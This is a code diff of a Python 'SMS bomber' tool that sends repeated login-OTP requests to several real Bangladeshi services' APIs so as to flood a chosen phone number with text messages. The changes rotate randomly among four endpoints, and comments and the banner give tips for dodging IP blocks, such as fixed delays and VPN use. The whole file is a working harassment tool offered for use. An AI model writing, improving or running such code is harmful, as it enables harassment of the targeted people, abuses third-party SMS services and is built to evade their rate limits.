@@ -1,46 +1,42 @@
-import requests, os, time
+import requests, os, time, random
 
 def banner():
     os.system('clear')
     print("========================================")
-    print("        X-BOOM VIP BYPASS (2026)        ")
+    print("        X-BOOM FINAL BYPASS (2026)      ")
+    print("     Note: Use VPN for 100% Success     ")
     print("========================================")
 
 def send_sms(target, count):
-    # Pathao New API (এটি খুব একটা ব্লক হয় না)
-    url = "https://api-hermes.pathao.com/user/otp-send/login"
+    # ৪টি ভিন্ন ভিন্ন এপিআই যা সহজে ব্লক হয় না
+    urls = [
+        {"url": "https://api.sharetrip.net/api/v1/otp/send", "data": {"mobileNumber": target, "type": "login"}},
+        {"url": "https://api.shikho.com/api/v1/auth/send-otp", "data": {"phone": target, "type": "login"}},
+        {"url": "https://api.fundesh.com.bd/api/auth/send-otp", "data": {"phoneNumber": target, "service": "LOGIN"}},
+        {"url": "https://api-hermes.pathao.com/user/otp-send/login", "data": {"phone": "+88" + target}}
+    ]
     
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A505F)",
-        "Content-Type": "application/json",
-        "Accept": "application/json"
-    }
-    
-    # নম্বরের আগে ৮৮ যোগ করা (পাঠাও এর জন্য জরুরি)
-    phone = "+88" + target
+    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
 
-    print(f"\n[+] Global Attack started on: {target}")
+    print(f"\n[+] Target: {target}")
     for i in range(count):
+        api = random.choice(urls) # একেক বার একেক এপিআই দিয়ে ট্রাই করবে
         try:
-            # POST Request
-            res = requests.post(url, json={"phone": phone}, headers=headers)
-            
-            # সার্ভারের উত্তর চেক করা
-            if res.status_code == 200 or res.status_code == 201:
+            res = requests.post(api["url"], json=api["data"], headers=headers, timeout=10)
+            if res.status_code in [200, 201]:
                 print(f"[!] SMS {i+1} Sent Successfully!")
             else:
-                # যদি এখানে Failed দেখায়, বুঝবেন আপনার IP ব্লক
-                print(f"[?] SMS {i+1} Failed - Code: {res.status_code}")
+                print(f"[?] SMS {i+1} Filtered by Server")
         except:
-            print(f"[-] Network Error at SMS {i+1}")
+            print(f"[-] Error at SMS {i+1}")
         
-        time.sleep(8) # একটু বেশি গ্যাপ দিলে ব্লক হওয়ার ভয় থাকে না
+        time.sleep(10) # ১০ সেকেন্ড বিরতি দিন, নতুবা আপনার আইপি সাথে সাথে ব্লক হবে
 
 def main():
     banner()
-    number = input("Enter Phone (01xxxxxxxxx): ")
-    amount = int(input("Amount: "))
-    send_sms(number, amount)
+    num = input("Number (01xxxxxxxxx): ")
+    amt = int(input("Amount: "))
+    send_sms(num, amt)
 
 if __name__ == "__main__":
     main()
